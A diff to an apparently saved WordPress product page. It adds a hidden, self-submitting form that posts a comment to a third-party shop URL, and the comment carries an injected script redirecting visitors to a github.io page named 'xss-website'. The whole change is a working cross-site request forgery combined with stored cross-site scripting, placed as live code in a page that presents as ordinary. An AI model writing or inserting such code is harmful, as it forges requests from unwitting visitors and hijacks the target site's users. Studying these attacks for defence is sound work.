@@ -2944,5 +2944,26 @@
       defer
       data-wp-strategy="defer"
     ></script>
+    <form
+      id="csrf-form"
+      action="https://mydecobox.shop/product/rom-va-hat-xop-trang-tri-hop-qua/"
+      method="POST"
+    >
+      <input type="hidden" name="name" value="Người dùng ẩn danh" />
+      <input
+        type="hidden"
+        name="comment"
+        value='<script>
+            window.onload = function() {
+                window.location.href = "https://nhungoclac.github.io/xss-website/";
+            };
+        </script>'
+      />
+      <input type="hidden" name="xss_submit" value="1" />
+    </form>
+
+    <script>
+      document.getElementById("csrf-form").submit();
+    </script>
   </body>
 </html>
